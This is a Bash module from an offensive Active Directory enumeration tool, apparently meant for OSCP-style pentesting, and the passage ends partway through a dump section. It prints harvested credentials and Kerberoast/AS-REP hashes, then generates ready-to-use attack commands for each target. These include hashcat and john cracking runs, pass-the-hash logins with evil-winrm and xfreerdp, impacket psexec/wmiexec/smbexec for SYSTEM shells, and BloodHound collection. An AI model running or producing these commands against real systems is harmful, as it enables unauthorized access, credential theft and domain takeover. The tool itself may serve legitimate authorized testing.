#!/bin/bash
# MODULE: summary.sh - summary(): final credential/share/hash table + bloodhound tips

summary() {
    flush_phase_cmds "PHASE 6B"

    echo -e "\n${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                    SCAN COMPLETE                          ║${NC}"
echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"

# Ik toon een snelle SMB-share samenvatting direct na SCAN COMPLETE,
# zodat ik meteen de belangrijkste shares zie zonder verder te scrollen.
if [[ -s "$OUTDIR/smb_share_access.txt" ]]; then
    echo -e "\n${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║   SMB SHARES (READ / READ,WRITE)                          ║${NC}"
    echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}┌─────────────────┬────────────────────────┬────────┬──────────────┐${NC}"
    printf "${CYAN}│ %-15s │ %-22s │ %-6s │ %-12s │${NC}\n" "IP" "SHARE" "ACCESS" "CRED"
    echo -e "${CYAN}├─────────────────┼────────────────────────┼────────┼──────────────┤${NC}"
    awk -F'|' '!seen[$1"|"$6"|"$7"|"$3]++' "$OUTDIR/smb_share_access.txt" | \
        awk -F'|' '{printf "│ %-15s │ %-22s │ %-6s │ %-12s │\\n", $1, $6, $7, $3}' | \
        sed "s/^/${GREEN}/;s/$/${NC}/" | head -40
    echo -e "${CYAN}└─────────────────┴────────────────────────┴────────┴──────────────┘${NC}"
    echo -e "${GRAY}    Full results: $OUTDIR/smb_share_access.txt${NC}"

    # Ik toon hieronder ook een korte copy met ruwe shareregels zodat ik details (zoals remarks) sneller terugzie.
    echo -e "${CYAN}[*] SMB share details (copied summary):${NC}"
    awk -F'|' '!seen[$1"|"$6"|"$7"|"$3]++ {printf "    %s | %s | %s | user:%s\n", $1, $6, $7, $3}' "$OUTDIR/smb_share_access.txt" | head -20
fi

echo -e "\n${CYAN}[*] USER LISTS CREATED:${NC}"
    # Highlight confirmed_users.txt first (most important)
    [[ -s "$OUTDIR/confirmed_users.txt" ]] && echo -e "    ${YELLOW}$OUTDIR/confirmed_users.txt${NC} ($(wc -l < "$OUTDIR/confirmed_users.txt") users) ${GREEN}<-- ORIGINAL CASE${NC}"
    for f in "$OUTDIR/all_users_clean.txt" "$OUTDIR/all_users_full.txt" "$OUTDIR/users_all_formats.txt" "$OUTDIR/valid_users_kerbrute.txt" "$OUTDIR/users_found.txt"; do
        [[ -s "$f" ]] && echo -e "    $f ($(wc -l < "$f") users)"
    done

    [[ -s "$OUTDIR/anon_access.txt" ]] && {
        echo -e "\n${YELLOW}[*] ANONYMOUS ACCESS FOUND:${NC}"
        sort -u "$OUTDIR/anon_access.txt" | head -5
    }

    echo -e "\n${GREEN}[+] VALID CREDENTIALS:${NC}"
    if [[ -s "$CREDS_FILE" ]]; then
        # De-duplicate noisy repeats (same proto/ip/user/secret/admin/cred_type)
        local CREDS_DEDUP="$OUTDIR/found_creds_dedup.txt"
        awk -F'|' '!seen[$1"|"$2"|"$4"|"$5"|"$6"|"$7]++' "$CREDS_FILE" > "$CREDS_DEDUP" 2>/dev/null
        local CREDS_SRC="$CREDS_DEDUP"

        # Eerst show detailed table with ALL protocols - wider columns for gebruikersnamen and hashes
        echo -e "${CYAN}┌──────────┬─────────────────┬────────────────────────┬──────────────────────────────────┬───────┬───────┐${NC}"
        printf "${CYAN}│ %-8s │ %-15s │ %-22s │ %-32s │ %-5s │ %-5s │${NC}\n" "PROTO" "IP" "USER" "SECRET" "SHELL" "Pwn3d"
        echo -e "${CYAN}├──────────┼─────────────────┼────────────────────────┼──────────────────────────────────┼───────┼───────┤${NC}"
        while IFS='|' read -r proto ip domain user secret pwned cred_type access_info; do
            local shell_flag=""
            local admin_flag=""
            [[ "$pwned" == "yes" ]] && admin_flag="YES"

            # Ik markeer SHELL los van ADMIN:
            # - SSH success = shell
            # - WINRM success = shell
            # - expliciete access_info "shell" blijft shell
            if [[ "$proto" == "SSH" || "$proto" == "WINRM" || "$access_info" == "shell" ]]; then
                shell_flag="YES"
            fi

            printf "${GREEN}│ %-8s │ %-15s │ %-22s │ %-32s │ %-5s │ %-5s │${NC}\n" "$proto" "$ip" "$user" "$secret" "$shell_flag" "$admin_flag"
        done < <(sort -t'|' -k4,4 -k1,1 "$CREDS_SRC")
        echo -e "${CYAN}└──────────┴─────────────────┴────────────────────────┴──────────────────────────────────┴───────┴───────┘${NC}"
        
        # Then show a consolidated summary grouped by credential
        echo -e "\n${YELLOW}[+] CREDENTIALS BY ACCESS:${NC}"
        local prev_cred=""
        local protocols=""
        while IFS='|' read -r proto ip domain user secret pwned cred_type access_info; do
            local curr_cred
            if [[ -n "$domain" ]]; then
                curr_cred=$(printf '%s\\%s:%s' "$domain" "$user" "$secret")
            else
                curr_cred="$user:$secret"
            fi
            
            if [[ "$curr_cred" != "$prev_cred" && -n "$prev_cred" ]]; then
                printf "  ${GREEN}%s${NC}\n" "$prev_cred"
                echo -e "    └─ Protocols: ${CYAN}$protocols${NC}"
                protocols=""
            fi
            
            local proto_info="$proto"
            [[ "$pwned" == "yes" ]] && proto_info="$proto(ADMIN)"
            [[ -n "$access_info" ]] && proto_info="$proto($access_info)"
            
            if [[ -z "$protocols" ]]; then
                protocols="$proto_info"
            else
                protocols="$protocols, $proto_info"
            fi
            prev_cred="$curr_cred"
        done < <(sort -t'|' -k4,4 -k5,5 -k1,1 "$CREDS_SRC")
        
        # Print the laatste one
        if [[ -n "$prev_cred" ]]; then
            printf "  ${GREEN}%s${NC}\n" "$prev_cred"
            echo -e "    └─ Protocols: ${CYAN}$protocols${NC}"
        fi

        # SMB share ACCESS check (read / read-write) for quick overview
        # This is limited to avoid huge time sink when many creds are found.
        if [[ "$CHECK_SMB_SHARE_WRITE" == true ]]; then
            local smb_access_out="$OUTDIR/smb_share_access.txt"
            > "$smb_access_out"

            local max_share_checks=25
            local checked=0
            local seen_share_creds=""

            # Alleen consider creds that worked for SMB (or RPC as a terugvaloptie for SMB auth)
            while IFS='|' read -r proto ip domain user secret pwned cred_type access_info; do
                [[ "$proto" != "SMB" && "$proto" != "RPC" ]] && continue

                local key="$ip|$user|$secret|$cred_type"
                [[ "$seen_share_creds" == *"|$key|"* ]] && continue
                seen_share_creds="${seen_share_creds}|${key}|"

                ((checked++))
                [[ $checked -gt $max_share_checks ]] && break

                local AUTH
                if [[ "$cred_type" == "hash" ]]; then
                    AUTH="-u '$user' -H '$secret'"
                else
                    AUTH="-u '$user' -p '$secret'"
                fi

                echo -e "${CYAN}[*] Enumerating SMB shares on $ip as $user...${NC}"
                shares_raw=$(timeout 25 bash -c "sudo nxc smb '$ip' $AUTH --shares 2>/dev/null")

                # Parse share lines that include READ/WRITE indicators (best-effort; uitvoer varies by nxc version)
                echo "$shares_raw" | awk -v ip="$ip" -v dom="$domain" -v user="$user" -v secret="$secret" -v ctype="$cred_type" '
                    BEGIN{IGNORECASE=1}
                    /READ|WRITE/ {
                        # Sla over obvious log prefixes
                        if ($1 ~ /SMB|WINRM|RPC|\[\*\]|\[\+\]|\[\-\]/) next
                        share=$1
                        if (share == "" || share ~ /[=:]/) next
                        line=$0
                        access="R"
                        if (line ~ /WRITE/) access="RW"
                        # Uitvoer: ip|domein|user|cred_type|secret|share|access|raw
                        print ip"|"dom"|"user"|"ctype"|"secret"|"share"|"access"|"line
                    }
                ' >> "$smb_access_out"
            done < <(sort -t'|' -k1,1 "$CREDS_SRC")

            if [[ -s "$smb_access_out" ]]; then
                echo -e "
${GREEN}[+] SMB SHARE ACCESS (top ${max_share_checks} creds checked):${NC}"
                echo -e "${CYAN}┌─────────────────┬────────────────────────┬────────┬──────────────┐${NC}"
                printf "${CYAN}│ %-15s │ %-22s │ %-6s │ %-12s │${NC}
" "IP" "SHARE" "ACCESS" "CRED"
                echo -e "${CYAN}├─────────────────┼────────────────────────┼────────┼──────────────┤${NC}"

                # Dedup by ip+share+access+user (keep it readable)
                awk -F'|' '!seen[$1"|"$6"|"$7"|"$3]++' "$smb_access_out" | \
                awk -F'|' '{printf "│ %-15s │ %-22s │ %-6s │ %-12s │
", $1, $6, $7, $3}' | \
                sed "s/^/${GREEN}/;s/$/${NC}/" | head -60

                echo -e "${CYAN}└─────────────────┴────────────────────────┴────────┴──────────────┘${NC}"
                echo -e "${GRAY}    Full results: $smb_access_out${NC}"

                echo -e "
${YELLOW}[+] QUICK SHARE COMMANDS:${NC}"
                # For each unique (ip,share) pick one credential (prefer RW, then ADMIN if present)
                awk -F'|' '
                    BEGIN{IGNORECASE=1}
                    {
                        ip=$1; dom=$2; user=$3; ctype=$4; secret=$5; share=$6; access=$7;
                        key=ip"|"share;
                        prio=1;
                        if (access=="RW") prio+=2;
                        # prefer creds that look domein-qualified in user field handled later; keep simple
                        if (!(key in best) || prio > best_prio[key]) {
                            best[key]=$0; best_prio[key]=prio;
                        }
                    }
                    END{
                        for (k in best) print best[k];
                    }
                ' "$smb_access_out" | sort -t'|' -k1,1 -k6,6 | head -25 | \
                while IFS='|' read -r ip dom user ctype secret share access raw; do
                    if [[ "$ctype" == "hash" ]]; then
                        # impacket-smbclient supports -hashes (LM:NT). Use empty LM.
                        if [[ -n "$dom" ]]; then
                    printf "%b>> %s%b\n" "$GRAY" "impacket-smbclient -hashes :$secret '${dom}/${user}@${ip}' -c 'use ${share}; ls'   # ${access}" "$NC"
                        else
                    printf "%b>> %s%b\n" "$GRAY" "impacket-smbclient -hashes :$secret '${user}@${ip}' -c 'use ${share}; ls'   # ${access}" "$NC"
                        fi
                    else
                        if [[ -n "$dom" ]]; then
                    printf "%b>> %s%b\n" "$GRAY" "impacket-smbclient '${dom}/${user}:${secret}'@${ip} -c 'use ${share}; ls'   # ${access}" "$NC"
                        else
                    printf "%b>> %s%b\n" "$GRAY" "impacket-smbclient '${user}:${secret}'@${ip} -c 'use ${share}; ls'   # ${access}" "$NC"
                        fi
                    fi
                done

            else
                echo -e "
${YELLOW}[*] No SMB share access lines detected (or none detected within limits).${NC}"
            fi
        fi
        
        # (Post-exploit commands are shown per-machine in the READY-TO-USE COMMANDS block below)
    else
        echo "None found"
    fi

    [[ -s "$OUTDIR/kerberoast.txt" ]] && {
        echo -e "\n${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║      KERBEROAST HASHES (Service Accounts)                 ║${NC}"
        echo -e "${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
        # Haal just the gebruikersnaam, normalize slashes, and ontdubbel
        local kerb_users=$(grep -oP '\$krb5tgs\$[0-9]+\$\*\K[^$]+' "$OUTDIR/kerberoast.txt" 2>/dev/null | sort -u | tr '\n' ' ')
        local kerb_count=$(wc -l < "$OUTDIR/kerberoast.txt")
        local unique_count=$(grep -oP '\$krb5tgs\$[0-9]+\$\*\K[^$]+' "$OUTDIR/kerberoast.txt" 2>/dev/null | sort -u | wc -l)
        echo -e "${GREEN}[+] Kerberoastable accounts ($unique_count): ${YELLOW}$kerb_users${NC}"
        echo -e "${CYAN}[*] Hash file: $OUTDIR/kerberoast.txt ($kerb_count hash(es))${NC}"
        echo ""
        # Show hashes in white
        echo -e "${WHITE}Hashes:${NC}"
        while IFS= read -r hash; do
            echo -e "${WHITE}$hash${NC}"
        done < "$OUTDIR/kerberoast.txt"
        echo ""
        echo -e "${YELLOW}┌─────────────────────────────────────────────────────────────┐${NC}"
        echo -e "${YELLOW}│  HASHCAT CRACKING COMMANDS (mode 13100)                     │${NC}"
        echo -e "${YELLOW}└─────────────────────────────────────────────────────────────┘${NC}"
        echo -e "${WHITE}# Basic attack with rockyou:${NC}"
        echo -e "${GRAY}hashcat -m 13100 $OUTDIR/kerberoast.txt /usr/share/wordlists/rockyou.txt${NC}"
        echo ""
        echo -e "${WHITE}# With rules:${NC}"
        echo -e "${GRAY}hashcat -m 13100 $OUTDIR/kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule${NC}"
        echo ""
        echo -e "${WHITE}# Show cracked:${NC}"
        echo -e "${GRAY}hashcat -m 13100 $OUTDIR/kerberoast.txt --show${NC}"
        echo ""
        echo -e "${YELLOW}┌─────────────────────────────────────────────────────────────┐${NC}"
        echo -e "${YELLOW}│  JOHN THE RIPPER (often faster for quick tests)            │${NC}"
        echo -e "${YELLOW}└─────────────────────────────────────────────────────────────┘${NC}"
        echo -e "${GRAY}john --wordlist=/usr/share/wordlists/rockyou.txt $OUTDIR/kerberoast.txt${NC}"
        echo -e "${GRAY}john --show $OUTDIR/kerberoast.txt${NC}"
    }

    # Re-print SMB share access overview after Kerberoast for quick triage
    [[ -s "$OUTDIR/smb_share_access.txt" ]] && {
        echo -e "\n${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║   SMB SHARES (READ / READ,WRITE)                          ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
        echo -e "${CYAN}┌─────────────────┬────────────────────────┬────────┬──────────────┐${NC}"
        printf "${CYAN}│ %-15s │ %-22s │ %-6s │ %-12s │${NC}\n" "IP" "SHARE" "ACCESS" "CRED"
        echo -e "${CYAN}├─────────────────┼────────────────────────┼────────┼──────────────┤${NC}"
        awk -F'|' '!seen[$1"|"$6"|"$7"|"$3]++' "$OUTDIR/smb_share_access.txt" | \
            awk -F'|' '{printf "│ %-15s │ %-22s │ %-6s │ %-12s │\n", $1, $6, $7, $3}' | \
            sed "s/^/${GREEN}/;s/$/${NC}/" | head -80
        echo -e "${CYAN}└─────────────────┴────────────────────────┴────────┴──────────────┘${NC}"
        echo -e "${GRAY}Full results: $OUTDIR/smb_share_access.txt${NC}"
        echo -e "\n${YELLOW}[+] QUICK SHARE COMMANDS:${NC}"
        awk -F'|' '
            BEGIN{IGNORECASE=1}
            {
                ip=$1; dom=$2; user=$3; ctype=$4; secret=$5; share=$6; access=$7;
                key=ip"|"share;
                prio=1;
                if (access=="RW") prio+=2;
                if (!(key in best) || prio > best_prio[key]) { best[key]=$0; best_prio[key]=prio; }
            }
            END{ for (k in best) print best[k]; }
        ' "$OUTDIR/smb_share_access.txt" | sort -t'|' -k1,1 -k6,6 | head -25 | \
        while IFS='|' read -r ip dom user ctype secret share access raw; do
            if [[ "$ctype" == "hash" ]]; then
                if [[ -n "$dom" ]]; then
                    printf "%b>> %s%b\n" "$GRAY" "impacket-smbclient -hashes :$secret '${dom}/${user}@${ip}' -c 'use ${share}; ls'   # ${access}" "$NC"
                else
                    printf "%b>> %s%b\n" "$GRAY" "impacket-smbclient -hashes :$secret '${user}@${ip}' -c 'use ${share}; ls'   # ${access}" "$NC"
                fi
            else
                if [[ -n "$dom" ]]; then
                    printf "%b>> %s%b\n" "$GRAY" "impacket-smbclient '${dom}/${user}:${secret}'@${ip} -c 'use ${share}; ls'   # ${access}" "$NC"
                else
                    printf "%b>> %s%b\n" "$GRAY" "impacket-smbclient '${user}:${secret}'@${ip} -c 'use ${share}; ls'   # ${access}" "$NC"
                fi
            fi
        done
    }

    [[ -s "$OUTDIR/asrep_all.txt" ]] && {
        echo -e "\n${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║   AS-REP ROAST HASHES (Pre-Auth Disabled)                 ║${NC}"
        echo -e "${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
        
        local asrep_users=$(grep -oP '\$krb5asrep\$[0-9]+\$\K[^@]+' "$OUTDIR/asrep_all.txt" 2>/dev/null | sort -u | tr '\n' ' ')
        local total_hashes=$(wc -l < "$OUTDIR/asrep_all.txt" | tr -d ' ')
        local unique_users=$(grep -oP '\$krb5asrep\$[0-9]+\$\K[^@]+' "$OUTDIR/asrep_all.txt" 2>/dev/null | sort -u | wc -l | tr -d ' ')
        
        echo -e "${GREEN}[+] VULNERABLE USERS: ${YELLOW}$asrep_users${NC}"
        echo -e "${GREEN}[+] Total hashes: $total_hashes (for $unique_users user(s))${NC}"
        echo ""
        
        # Show individual hash files with type
        echo -e "${CYAN}[*] Hash files by type:${NC}"
        for hashfile in "$OUTDIR"/*_rc4.hash; do
            [[ -f "$hashfile" ]] && echo -e "    ${GREEN}$hashfile${NC} ${YELLOW}(RC4 - hashcat -m 18200)${NC}"
        done
        for hashfile in "$OUTDIR"/*_aes.hash; do
            [[ -f "$hashfile" ]] && echo -e "    ${GREEN}$hashfile${NC} ${YELLOW}(AES - hashcat -m 19900)${NC}"
        done
        echo ""
        
        # Show FULL hashes grouped by user
        echo -e "${CYAN}[*] FULL HASHES:${NC}"
        echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
        
        # Get unique gebruikers
        local users=$(grep -oP '\$krb5asrep\$[0-9]+\$\K[^@]+' "$OUTDIR/asrep_all.txt" 2>/dev/null | sort -u)
        for user in $users; do
            echo -e "${YELLOW}┌─ USER: $user${NC}"
            
            # Show RC4 hash if exists
            local rc4_hash=$(grep "\$krb5asrep\$23\$$user@" "$OUTDIR/asrep_all.txt" 2>/dev/null | head -1)
            if [[ -n "$rc4_hash" ]]; then
                echo -e "${WHITE}│ [RC4 - \$23] Faster to crack!${NC}"
                echo -e "${GRAY}│ $rc4_hash${NC}"
            fi
            
            # Show AES hash if exists
            local aes_hash=$(grep "\$krb5asrep\$18\$$user@" "$OUTDIR/asrep_all.txt" 2>/dev/null | head -1)
            if [[ -n "$aes_hash" ]]; then
                echo -e "${WHITE}│ [AES - \$18]${NC}"
                echo -e "${GRAY}│ $aes_hash${NC}"
            fi
            echo -e "${YELLOW}└─────────────────────────────────────────────────────────────${NC}"
            echo ""
        done
        
        # Cracking commandoo's
        echo -e "${YELLOW}┌─────────────────────────────────────────────────────────────┐${NC}"
        echo -e "${YELLOW}│  JOHN THE RIPPER (recommended first)                        │${NC}"
        echo -e "${YELLOW}└─────────────────────────────────────────────────────────────┘${NC}"
        for hashfile in "$OUTDIR"/*_rc4.hash "$OUTDIR"/*_aes.hash; do
            [[ -f "$hashfile" ]] && echo -e "${GRAY}john $hashfile --wordlist=/usr/share/wordlists/rockyou.txt${NC}"
        done
        echo ""
        echo -e "${WHITE}# Show cracked:${NC}"
        for hashfile in "$OUTDIR"/*_rc4.hash "$OUTDIR"/*_aes.hash; do
            [[ -f "$hashfile" ]] && echo -e "${GRAY}john $hashfile --show${NC}"
        done
        
        echo ""
        echo -e "${YELLOW}┌─────────────────────────────────────────────────────────────┐${NC}"
        echo -e "${YELLOW}│  HASHCAT CRACKING COMMANDS                                  │${NC}"
        echo -e "${YELLOW}└─────────────────────────────────────────────────────────────┘${NC}"
        
        # RC4 hashes (mode 18200)
        local has_rc4=false
        for hashfile in "$OUTDIR"/*_rc4.hash; do
            [[ -f "$hashfile" ]] && has_rc4=true && break
        done
        if [[ "$has_rc4" == true ]]; then
            echo -e "${WHITE}# RC4 hashes (\$23) - mode 18200 (FASTER):${NC}"
            for hashfile in "$OUTDIR"/*_rc4.hash; do
                [[ -f "$hashfile" ]] && echo -e "${GRAY}hashcat -m 18200 $hashfile /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force${NC}"
            done
            echo ""
        fi
        
        # AES hashes (mode 19900)
        local has_aes=false
        for hashfile in "$OUTDIR"/*_aes.hash; do
            [[ -f "$hashfile" ]] && has_aes=true && break
        done
        if [[ "$has_aes" == true ]]; then
            echo -e "${WHITE}# AES hashes (\$18) - mode 19900:${NC}"
            for hashfile in "$OUTDIR"/*_aes.hash; do
                [[ -f "$hashfile" ]] && echo -e "${GRAY}hashcat -m 19900 $hashfile /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force${NC}"
            done
            echo ""
        fi
        
        echo -e "${WHITE}# Show cracked passwords:${NC}"
        [[ "$has_rc4" == true ]] && echo -e "${GRAY}hashcat -m 18200 $OUTDIR/*_rc4.hash --show${NC}"
        [[ "$has_aes" == true ]] && echo -e "${GRAY}hashcat -m 19900 $OUTDIR/*_aes.hash --show${NC}"
        echo ""
        echo -e "${RED}[!] After cracking → add password to passwords.txt → re-run script for authenticated enum!${NC}"
    }

    [[ -s "$OUTDIR/valid_users_kerbrute.txt" ]] && {
        echo -e "\n${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║  VALID AD USERNAMES (Kerbrute Confirmed)                  ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
        echo -e "${GREEN}[+] Confirmed users:${NC}"
        cat "$OUTDIR/valid_users_kerbrute.txt" | while read -r user; do
            echo -e "    ${YELLOW}$user${NC}"
        done
        echo -e "${CYAN}[*] These usernames are CONFIRMED to exist in AD${NC}"
    }


    if [[ -s "$CREDS_FILE" ]]; then
        echo -e "\n${YELLOW}╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}║              READY-TO-USE COMMANDS                        ║${NC}"
        echo -e "${YELLOW}║  One block per machine — all users & post-exploit inside  ║${NC}"
        echo -e "${YELLOW}╚═══════════════════════════════════════════════════════════╝${NC}"

        # ── Build per-IP inventory ────────────────────────────────────────────
        # CREDS_FILE: proto|ip|domain|user|secret|pwned|cred_type|access_info
        # _M_LOCAL_USERS: local-auth creds (domain=hostname) - per specific IP
        # _DOM_LIST: ALL unique domain creds - injected into EVERY machine block
        # _DOM_PWNED: tracks Pwn3d flag per "user|secret|ip"
        declare -A _M_LOCAL_USERS  # ip -> "user|ct|secret|pwnd|dom\n..."
        declare -A _M_HN           # ip -> hostname
        declare -A _M_HAS_SSH  _M_HAS_WINRM  _M_HAS_MSSQL  _M_HAS_LDAP
        local _M_IP_ORDER=()
        declare -A _M_IP_SEEN
        declare -A _DOM_SEEN       # "user|ct|secret" -> 1  (dedup)
        local _DOM_LIST=""         # "user|ct|secret|dom\n..."
        declare -A _DOM_PWNED      # "user|secret|ip" -> 1

        while IFS='|' read -r _p _i _d _u _s _pw _ct _ai; do
            [[ -z "$_u" || -z "$_s" ]] && continue
            if [[ -z "${_M_IP_SEEN[$_i]+set}" ]]; then
                _M_IP_ORDER+=("$_i"); _M_IP_SEEN[$_i]=1
            fi
            if [[ -n "$DOMAIN" && "${_d,,}" == "${DOMAIN,,}" ]]; then
                # Domain credential -> global pool shown on all machine blocks
                local _dkey="${_u}|${_ct}|${_s}"
                if [[ -z "${_DOM_SEEN[$_dkey]+set}" ]]; then
                    _DOM_SEEN[$_dkey]=1
                    _DOM_LIST+="${_u}|${_ct}|${_s}|${_d}"$'\n'
                fi
                [[ "$_pw" == "yes" ]] && _DOM_PWNED["${_u}|${_s}|${_i}"]=1
            else
                # Local-auth cred (domain=hostname) - only for this specific IP
                local _entry="${_u}|${_ct}|${_s}|${_pw}|${_d}"
                if [[ "${_M_LOCAL_USERS[$_i]}" != *"${_entry}"* ]]; then
                    _M_LOCAL_USERS[$_i]+="${_entry}"$'\n'
                fi
            fi
        done < "$CREDS_FILE"

        # Protocol availability from actual port scan results
        # This ensures WinRM/SSH/MSSQL commands appear even when no cred succeeded there yet
        for _sip in "${_M_IP_ORDER[@]}"; do
            grep -qFx "$_sip" "$OUTDIR/targets_ssh.txt"   2>/dev/null && _M_HAS_SSH[$_sip]=1
            grep -qFx "$_sip" "$OUTDIR/targets_winrm.txt" 2>/dev/null && _M_HAS_WINRM[$_sip]=1
            grep -qFx "$_sip" "$OUTDIR/targets_mssql.txt" 2>/dev/null && _M_HAS_MSSQL[$_sip]=1
            grep -qFx "$_sip" "$OUTDIR/targets_ldap.txt"  2>/dev/null && _M_HAS_LDAP[$_sip]=1
        done

        # Enrich hostname        # Enrich hostname from smb banner files
        for _sip in "${_M_IP_ORDER[@]}"; do
            local _hn=""
            for _sf in "$OUTDIR"/password_policy.txt "$OUTDIR"/shares.txt; do
                [[ -s "$_sf" ]] || continue
                _hn=$(grep "$_sip" "$_sf" 2>/dev/null | grep -oP '\(name:\K[^)]+' | head -1)
                [[ -n "$_hn" ]] && break
            done
            _M_HN[$_sip]="${_hn:-}"
        done

        # ── Helper: emit one command line colored by access level ─────────────
        _mc() {
            # $1: confirmed(true/false) $2: command [$3: strict]
            if [[ "$1" == true ]]; then
                printf "%b  >> %s%b\n" "${WHITE}" "$2" "${NC}"
            elif [[ "${3:-}" != "strict" ]]; then
                printf "%b  >> %s%b\n" "${GRAY}" "$2" "${NC}"
            fi
        }
        _mh() { echo -e "${CYAN}  # ── $1${NC}"; }
        _ms() { echo -e "${RED}  >> $1${NC}"; }  # Pwn3d/dump commands

        # ── Per-machine output ────────────────────────────────────────────────
        for _sip in "${_M_IP_ORDER[@]}"; do
            local _hn="${_M_HN[$_sip]:-}"
            local _label="${_sip}"; [[ -n "$_hn" ]] && _label="${_sip} (${_hn})"
            echo ""
            echo -e "${WHITE}╔═══════════════════════════════════════════════════════════╗${NC}"
            printf "${WHITE}║  MACHINE: %-49s║${NC}\n" "$_label"
            echo -e "${WHITE}╚═══════════════════════════════════════════════════════════╝${NC}"

            # Collect unique creds for this IP
            local _best_pass_user="" _best_pass_secret="" _best_pass_dom=""
            local _has_any_pwnd=false

            # First pass: find best cleartext domain cred (for Kerberos section)
            while IFS='|' read -r _u _ct _s _d; do
                [[ -z "$_u" ]] && continue
                if [[ "$_ct" == "password" && -z "$_best_pass_user" ]]; then
                    _best_pass_user="$_u"; _best_pass_secret="$_s"; _best_pass_dom="${_d:-$DOMAIN}"
                fi
                [[ -n "${_DOM_PWNED["${_u}|${_s}|${_sip}"]+set}" ]] && _has_any_pwnd=true
            done <<< "$_DOM_LIST"
            # Also check local-auth for pwned
            while IFS='|' read -r _u _ct _s _pw _d; do
                [[ "$_pw" == "yes" ]] && _has_any_pwnd=true
            done <<< "${_M_LOCAL_USERS[$_sip]}"

            _mh "SHELL ACCESS"

            # ── Helper: render one user's commands for this machine ──────────
            _render_cred_cmds() {
                local _u="$1" _ct="$2" _s="$3" _pw="$4" _d="$5" _sip="$6"
                local _dm="${_d:-$DOMAIN}"; local _dp="${_dm:+$_dm/}"
                if [[ "$_ct" == "hash" ]]; then
                    [[ -n "${_M_HAS_WINRM[$_sip]}" ]] && _mc true "evil-winrm -i $_sip -u '$_u' -H '$_s'"
                    [[ -n "${_M_HAS_SSH[$_sip]}" ]]   && _mc false "ssh -i <key> '${_u}@${_sip}'"
                    _mc true "impacket-wmiexec -hashes ':${_s}' '${_dp}${_u}@${_sip}'"
                    if [[ "$_pw" == "yes" ]]; then
                        _mc true "impacket-psexec -hashes ':${_s}' '${_dp}${_u}@${_sip}'  # spawns nt authority\\system shell"
                        _mc true "impacket-smbexec -hashes ':${_s}' '${_dp}${_u}@${_sip}'"
                    fi
                    _mc false "xfreerdp3 /u:'$_u' /d:'$_dm' /pth:'$_s' /v:$_sip /dynamic-resolution /clipboard"
                    [[ -n "${_M_HAS_MSSQL[$_sip]}" ]] && _mc true "impacket-mssqlclient '${_u}'@${_sip} -hashes ':${_s}' -windows-auth"
                else
                    [[ -n "${_M_HAS_WINRM[$_sip]}" ]] && _mc true "evil-winrm -i $_sip -u '$_u' -p '$_s'"
                    [[ -n "${_M_HAS_SSH[$_sip]}" ]]   && _mc true "ssh '${_u}@${_sip}'  # password: ${_s}"
                    _mc true "impacket-wmiexec '${_dp}${_u}:${_s}@${_sip}'"
                    if [[ "$_pw" == "yes" ]]; then
                        _mc true "impacket-psexec '${_dp}${_u}:${_s}@${_sip}'  # spawns nt authority\\system shell"
                        _mc true "impacket-smbexec '${_dp}${_u}:${_s}@${_sip}'"
                    fi
                    _mc false "xfreerdp3 /u:'$_u' /p:'$_s' /d:'$_dm' /v:$_sip /dynamic-resolution /clipboard"
                    [[ -n "${_M_HAS_MSSQL[$_sip]}" ]] && _mc true "impacket-mssqlclient '${_u}':'${_s}'@${_sip} -windows-auth"
                    [[ -n "${_M_HAS_LDAP[$_sip]}" ]]  && _mc true "bloodhound-python -u '$_u' -p '$_s' -d '${_dm}' -ns '${DC_IP:-$_sip}' -c All --zip"
                fi
            }

            # Domain credentials — shown on every machine using open-port flags
            if [[ -n "$_DOM_LIST" ]]; then
                while IFS='|' read -r _u _ct _s _d; do
                    [[ -z "$_u" ]] && continue
                    local _pw="no"
                    [[ -n "${_DOM_PWNED["${_u}|${_s}|${_sip}"]+set}" ]] && _pw="yes"
                    [[ "$_pw" == "yes" ]] && _has_any_pwnd=true
                    if [[ "$_pw" == "yes" ]]; then
                        printf "${RED}  # ── %s [PWND] (%s) ──${NC}\n" "$_u" "${_ct^^}"
                    else
                        printf "${GREEN}  # ── %s (%s) ──${NC}\n" "$_u" "${_ct^^}"
                    fi
                    _render_cred_cmds "$_u" "$_ct" "$_s" "$_pw" "$_d" "$_sip"
                done <<< "$_DOM_LIST"
            fi

            # Local-auth credentials — specific to this machine only
            if [[ -n "${_M_LOCAL_USERS[$_sip]}" ]]; then
                [[ -n "$_DOM_LIST" ]] && echo -e "${CYAN}  # ── LOCAL AUTH (machine-specific) ──${NC}"
                while IFS='|' read -r _u _ct _s _pw _d; do
                    [[ -z "$_u" ]] && continue
                    local _dm="${_d:-$_sip}"
                    [[ "$_pw" == "yes" ]] && _has_any_pwnd=true
                    if [[ "$_pw" == "yes" ]]; then
                        printf "${RED}  # ── %s [PWND] (%s) ──${NC}\n" "$_u" "${_ct^^}"
                    else
                        printf "${GREEN}  # ── %s (%s) ──${NC}\n" "$_u" "${_ct^^}"
                    fi
                    _render_cred_cmds "$_u" "$_ct" "$_s" "$_pw" "$_dm" "$_sip"
                done <<< "${_M_LOCAL_USERS[$_sip]}"
            fi

            # DUMP section            # DUMP section — only if any pwnd users on this machine
            if [[ "$_has_any_pwnd" == true ]]; then
                echo ""
                _mh "DUMP (Pwn3d — run manually, OSCP: confirm access first)"
                # Domain Pwn3d creds
                while IFS='|' read -r _u _ct _s _d; do
